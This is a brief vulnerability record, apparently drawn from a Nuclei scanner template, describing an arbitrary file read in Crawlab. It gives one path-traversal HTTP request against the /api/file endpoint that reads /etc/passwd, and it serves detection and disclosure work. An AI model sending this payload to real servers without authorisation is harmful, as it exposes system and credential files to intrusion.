# Vulnerability: Crawlab - Arbitrary File Read
**Classification:** CWE-23,CWE-73
**Source:** Nuclei Template (`crawlab-lfi.yaml`)

## Description
Crawlab is vulnerable to arbitrary file read.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/api/file?path=../../etc/passwd
```

